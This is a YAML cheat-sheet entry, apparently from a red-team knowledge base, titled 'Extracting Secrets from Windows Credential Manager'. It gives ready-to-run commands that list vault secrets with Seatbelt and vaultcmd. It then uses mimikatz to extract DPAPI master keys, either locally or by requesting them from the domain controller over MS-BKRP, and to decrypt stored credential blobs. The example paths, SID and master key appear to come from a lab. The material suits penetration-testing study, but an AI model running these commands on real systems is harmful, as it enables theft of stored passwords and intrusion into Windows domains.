title: Extracting Secrets from Windows Credential Manager
category: 
  - AD:
    - Credential Access
tactic: Credential Access
tags: []
description:
  - title: Overview
    content: Extracting Secrets from Windows Credential Manager
    references:
      - type: link
        value: https://github.com/GhostPack/Seatbelt

steps:
  - description: List secrets
    options: 
      - tool: Seatbelt
        usage: |
          Seatbelt.exe WindowsVault
          Seatbelt.exe WindowsCredentialFiles
      
      - tool: cmd.exe
        usage: vaultcmd /list
  
  - description: Extract the AES128/256 encryption key
    options: 
      - tool: mimikatz 
        usage: |
          #locally
          mimikatz !sekurlsa::dpapi
      
      - tool: mimikatz 
        usage: |
          #request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP)
          mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

  - description: Decrypt the blobs
    options: 
      - tool: mimikatz 
        usage: |
          mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

comments:
  